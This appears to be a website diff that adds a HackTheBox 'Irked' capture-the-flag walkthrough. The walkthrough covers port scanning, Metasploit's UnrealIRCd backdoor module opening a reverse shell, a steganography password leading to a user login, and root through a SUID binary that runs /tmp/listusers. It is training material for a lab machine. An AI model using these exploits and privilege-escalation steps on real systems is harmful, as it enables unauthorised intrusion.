@@ -49,7 +49,7 @@ Author URL: http://w3layouts.com
 <section class="w3l-about-breadcrum">
   <div class="breadcrum-bg">
     <div class="container py-5">
-      <p><a href="index.html">Home</a> &nbsp; / &nbsp; Posts &nbsp;/ &nbsp; Valentine</p>
+      <p><a href="index.html">Home</a> &nbsp; / &nbsp; Posts &nbsp;/ &nbsp; Irked</p>
      </div>
   </div>
 </section>
@@ -57,38 +57,292 @@ Author URL: http://w3layouts.com
 <div class="w3l-content-photo-5 py-5" id="about">
 	<div class="content-main pt-lg-5 pt-md-3 pb-0">
 		<div class="container">
-			<div class="row" >
-				<div class="col-lg-5 content-photo" style="text-align:center">
-					<a ><img src="/Posts/Valentine/0.png" class="img-fluid" alt="content-photo" ></a>
-				</div>
-				<div class="col-lg-7 content-left mt-lg-0 mt-5 pl-lg-5" align="left">
-					
-                </div>
-                <div class="col-lg-7 content-left mt-lg-0 mt-5 pl-lg-0left" style="text-align:left">
-                
-                </div>
-			</div>
-            
-        </div>
             <div style="text-align:center;padding-top: 10px">
-                    <h3 class = "mb-2"style="font-size: 35px;line-height: 45px;color: var(--title-color);font-weight: 700; }">Valentine</h3>
-					<p class="mb-2">Posted on 6/19</p>
+           					<a ><img src="/Posts/Irked/0.png" class="img-fluid" alt="content-photo" ></a>
+                    <h3 class = "mb-2"style="font-size: 35px;line-height: 45px;color: var(--title-color);font-weight: 700; }">Irked</h3>
+					          <p class="mb-2">Posted on 6/15</p>
                     <p class="mb-2">Source: <a href="https://www.hackthebox.eu/" target="_blank" style="color: #33cc33;text-align:right"> hackthebox</a></p>
                     <h3 class="mb-2"style="font-size: 35px;line-height: 45px;color: var(--title-color);font-weight: 700; }">Enumeration</h3>
-                    <p class="mb-2">Let's begin with nmap</p>
+                    <p class="mb-2">Let's start with nmap</p>
             </div>
-                        
+            <div class=hljs>
+                <a>
+                kali@kali:~/hackthebox/Practice/Irked$ cat nmap.txt <br>
+                # Nmap 7.80 scan initiated Mon Jun  8 10:48:54 2020 as: nmap -sC -sV -oN nmap.txt -p- 10.10.10.117<br>
+                Nmap scan report for 10.10.10.117<br>
+                Host is up (0.023s latency).<br>
+                Not shown: 65528 closed ports<br>
+                PORT      STATE SERVICE VERSION<br>
+                22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)<br>
+                | ssh-hostkey: <br>
+                |   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)<br>
+                |   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)<br>
+                |   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)<br>
+                |_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)<br>
+                80/tcp    open  http    Apache httpd 2.4.10 ((Debian))<br>
+                |_http-server-header: Apache/2.4.10 (Debian)<br>
+                |_http-title: Site doesnt have a title (text/html).<br>
+                111/tcp   open  rpcbind 2-4 (RPC #100000)<br>
+                | rpcinfo: <br>
+                |   program version    port/proto  service<br>
+                |   100000  2,3,4        111/tcp   rpcbind<br>
+                |   100000  2,3,4        111/udp   rpcbind<br>
+                |   100000  3,4          111/tcp6  rpcbind<br>
+                |   100000  3,4          111/udp6  rpcbind<br>
+                |   100024  1          35330/udp6  status<br>
+                |   100024  1          45857/udp   status<br>
+                |   100024  1          46205/tcp   status<br>
+                |_  100024  1          51813/tscp6  status<br>
+                6697/tcp  open  irc     UnrealIRCd<br>
+                8067/tcp  open  irc     UnrealIRCd<br>
+                46205/tcp open  status  1 (RPC #100024)<br>
+                65534/tcp open  irc     UnrealIRCd<br>
+                Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br>
+<br>
+                Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>
+                # Nmap done at Mon Jun  8 10:50:48 2020 -- 1 IP address (1 host up) scanned in 113.77 seconds<br>
+                </a> 
+            </div>
+            <div style="text-align:center;padding-top: 10px">
+              <p class="mb-2" style="font-weight:100">Let's see what's at port 80.  </p>
+     					<a ><img src="/Posts/Irked/1.png" class="img-fluid" alt="content-photo" ></a>
+              <p class="mb-2" style="font-weight:100">Let's run gobuster to see if we find anything.
+              </p>
+            </div>
+            <div class="hljs">
+              <a>
+                kali@kali:~/hackthebox/Practice/Irked$ ~/Downloads/gobuster/gobuster dir -u 10.10.10.117 -w /usr/share/wordlists/dirb/directory-list-2.3-small.txt -x php,log,html,txt<br>
+                ===============================================================<br>
+                Gobuster v3.0.1<br>
+                by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)<br>
+                ===============================================================<br>
+                [+] Url:            http://10.10.10.117<br>
+                [+] Threads:        10<br>
+                [+] Wordlist:       /usr/share/wordlists/dirb/directory-list-2.3-small.txt<br>
+                [+] Status codes:   200,204,301,302,307,401,403<br>
+                [+] User Agent:     gobuster/3.0.1<br>
+                [+] Extensions:     log,html,txt,php<br>
+                [+] Timeout:        10s<br>
+                ===============================================================<br>
+                2020/06/12 12:21:21 Starting gobuster<br>
+                ===============================================================<br>
+                /index.html (Status: 200)<br>
+                /manual (Status: 301)<br>
+              </a>
+            </div>
+            <div style="text-align:center;padding-top: 10px">
+            <p class="mb-2" style="font-weight:100">
+            
+            There's nothing interesting here. Lets see if there are any vulnerabilities with the other services we found.
+            </p>
+            <h3 class = "mb-2"style="font-size: 35px;line-height: 45px;color: var(--title-color);font-weight: 700; }">Foothold</h3>
+            </div>
+            <div class="hljs">
+            <a>
+            kali@kali:~/git/ctf-writeups/hackthebox/Irked$ searchsploit unrealIRC<br>
+            --------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br>
+             Exploit Title                                                                                                             |  Path<br>
+            --------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br>
+            UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)                                                               | linux/remote/16922.rb<br>
+            UnrealIRCd 3.2.8.1 - Local Configuration Stack Overflow                                                                    | windows/dos/18011.txt<br>
+            UnrealIRCd 3.2.8.1 - Remote Downloader/Execute                                                                             | linux/remote/13853.pl<br>
+            UnrealIRCd 3.x - Remote Denial of Service                                                                                  | windows/dos/27407.pl<br>
+            --------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br>
+            Shellcodes: No Results
+            </a>
+            </div>
+            <div style="text-align:center;padding-top: 10px">
+            <p class="mb-2" style="font-weight:100">
+            Nice! Lets check out the metasploit module.
+            </p>
+            </div>
+            <div class="hljs">
+            <a>
+            msf5 > search unreal
+
+            Matching Modules<br>
+            ================<br>
+
+               #  Name                                        Disclosure Date  Rank       Check  Description<br>
+               -  ----                                        ---------------  ----       -----  -----------<br>
+               0  exploit/linux/games/ut2004_secure           2004-06-18       good       Yes    Unreal Tournament 2004 "secure" Overflow (Linux)<br>
+               1  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution<br>
+               2  exploit/windows/games/ut2004_secure         2004-06-18       good       Yes    Unreal Tournament 2004 "secure" Overflow (Win32)<br>
+<br>
+<br>
+            msf5 > use 1<br>
+            msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > options<br>
+<br>
+            Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):<br>
+<br>
+               Name    Current Setting  Required  Description<br>
+               ----    ---------------  --------  -----------<br>
+               RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'<br>
+               RPORT   6667             yes       The target port (TCP)<br>
+<br>
+<br>
+            Exploit target:<br>
+<br>
+               Id  Name<br>
+               --  ----<br>
+               0   Automatic Target<br>
+<br>
+<br>
+            msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 10.10.10.117<br>
+            RHOSTS => 10.10.10.117<br>
+            msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RPORT 6697<br>
+            RPORT => 6697<br>
+            msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > run<br>
+<br>
+            [*] Started reverse TCP double handler on 10.10.14.13:4444 <br>
+            [*] 10.10.10.117:6697 - Connected to 10.10.10.117:6697...<br>
+                :irked.htb NOTICE AUTH :*** Looking up your hostname...<br>
+            [*] 10.10.10.117:6697 - Sending backdoor command...<br>
+            [*] Accepted the first client connection...<br>
+            [*] Accepted the second client connection...<br>
+            [*] Command: echo mnbyuhnupKUOCVK3;<br>
+            [*] Writing to socket A<br>
+            [*] Writing to socket B<br>
+            [*] Reading from sockets...<br>
+            [*] Reading from socket B<br>
+            [*] B: "mnbyuhnupKUOCVK3\r\n"<br>
+            [*] Matching...<br>
+            [*] A is input...<br>
+            [*] Command shell session 1 opened (10.10.14.13:4444 -> 10.10.10.117:52637) at 2020-06-12 11:54:32 -0400<br>
+
+            python -c 'import pty;pty.spawn("/bin/bash");'<br>
+            ircd@irked:~/Unreal3.2$ <br>
+            </a>
+            </div>
+            <div style="text-align:center;padding-top: 10px">
+            <p class="mb-2" style="font-weight:100">
+            Now that we got a low priviledge shell lets move on to user.
+            </p>
+            </div>
+            <div style="text-align:center;padding-top: 10px">
+            <p class="mb-2" style="font-weight:100">
+            <h3 class = "mb-2"style="font-size: 35px;line-height: 45px;color: var(--title-color);font-weight: 700; }">User</h3>
+            <p class="mb-2" style="font-weight:100">
+            After some poking around, I found another user named djmardov and some interesting files.
+            </p>
+            </div>
+            <div class="hljs">
+            <a>
+            ircd@irked:/home/djmardov/Documents$ ls -la <br>
+            ls -la<br>
+            total 16<br>
+            drwxr-xr-x  2 djmardov djmardov 4096 May 15  2018 .<br>
+            drwxr-xr-x 18 djmardov djmardov 4096 Nov  3  2018 ..<br>
+            -rw-r--r--  1 djmardov djmardov   52 May 16  2018 .backup<br>
+            -rw-------  1 djmardov djmardov   33 May 15  2018 user.txt<br>
+            ircd@irked:/home/djmardov/Documents$ cat .back<br>
+            cat .backup <br>
+            lSuper elite steg backup pw<br>
+            UPupDOWNdownLRlrBAbaSSss<br>
+            </a>
+            </div>
+            <div style="text-align:center;padding-top: 10px">
+            <p class="mb-2" style="font-weight:100">
+            We found a password for a steg challenge. 
+            If you remember the home page, there was an image there we could download, or from /var/www/irked.jpg. On our machine:
+            </p>
+            </div>
+            <div class="hljs">
+            <a>
+            kali@kali:~/hackthebox/Practice/Irked$ steghide extract -sf irked.jpg <br>
+            Enter passphrase: <br>
+            wrote extracted data to "pass.txt".<br>
+            kali@kali:~/hackthebox/Practice/Irked$ cat pass.txt <br>
+            Kab6h+m+bbp2J:HG<br>
+            </a>
+          </div>
+          <div style="text-align:center;padding-top: 5px">
+            <p class="mb-2" style="font-weight:100">
+            A su password maybe?
+            </p>
+          </div>
+          <div class ="hljs">
+          <p>
+          ircd@irked:/home/djmardov/Documents$su djmardov<br>
+          su djmardov<br>
+          Password: Kab6h+m+bbp2J:HG<br>
+          <br>
+          djmardov@irked:~/Documents$ ls<br>
+          ls<br>
+          user.txt<br>
+          djmardov@irked:~/Documents$ cat user.txt<br>
+          cat user.txt<br>
+          4a66a78b12dc0e661a59d3f5c0267a8e<br>
+          </p>
+          </div>          
+            <div style="text-align:center;padding-top: 10px">      
+            <h3 class = "mb-2"style="font-size: 35px;line-height: 45px;color: var(--title-color);font-weight: 700; }">Priviledge Escalation</h3>
+            <p class="mb-2" style="font-weight:100">
+            To begin:
+            </p>
+          </div>
+          <div class="hljs">
+          <a>
+          djmardov@irked:~/Documents$ find /usr/bin/ -perm -4000<br>
+          find /usr/bin/ -perm -4000<br>
+          /usr/bin/chsh<br>
+          /usr/bin/procmail<br>
+          /usr/bin/gpasswd<br>
+          /usr/bin/newgrp<br>
+          /usr/bin/at<br>
+          /usr/bin/pkexec<br>
+          /usr/bin/X<br>
+          /usr/bin/passwd<br>
+          /usr/bin/chfn<br>
+          /usr/bin/viewuser<br>
+          </a>
+          </div>
+          <div style="text-align:center;padding-top: 10px">
+          <p class="mb-2" style="font-weight:100">
+            This command searches for binaries with the SUID bit set, 
+            meaning it runs with root access. If you have done previous linux boxes, you know what to expect here. The binary that 
+            stands out is /usr/bin/viewuser. Let's see what it does.
+          </p>
+          </div>
+          <div class="hljs">
+          <a>
+          djmardov@irked:/usr/bin$ viewuser<br>
+          viewuser<br>
+          This application is being devleoped to set and test user permissions<br>
+          It is still being actively developed<br>
+          (unknown) :0           2020-06-12 11:30 (:0)<br>
+          sh: 1: /tmp/listusers: not found<br>
+          </a>
+          </div>
+          <div style="text-align:center;padding-top: 10px">
+          <p class="mb-2" style="font-weight:100">
+          The bin is looking 
+          for a file in /tmp/listusers, maybe we can use it to get a shell.
+          </p>
+          </div>
+          <div class="hljs">
+          <a>
+          djmardov@irked:/tmp$ echo '/bin/sh' > listusers<br>
+          echo '/bin/sh' > listusers<br>
+          djmardov@irked:/tmp$ chmod +rwx listusers<br>
+          chmod +rwx listusers<br>
+          djmardov@irked:/tmp$ /uar/bin/viewuser<br>
+          /usr/bin/viewuser   <br>
+          This application is being devleoped to set and test user permissions<br>
+          It is still being actively developed<br>
+          (unknown) :0           2020-06-12 11:30 (:0)<br>
+          # whoami<br>
+          whoami<br>
+          root<br>
+          # cat /root/root.txt<br>
+          cat /root/root.txt<br>
+          8d8e9e8be64654b6dccc3bff4522daf3<br>
+          </a>
+          </div>
      </div>
-    
+  </div>  
 </div>
 
-<!-- //w3l-content-photo-5 -->
-<!-- home page service grids -->
-
-<!-- //home page service grids -->
-
- 
- <!-- grids block 5 -->
  <section class="w3l-footer-29-main" id="footer">
   <div class="footer-29 text-center">
       <div class="container">
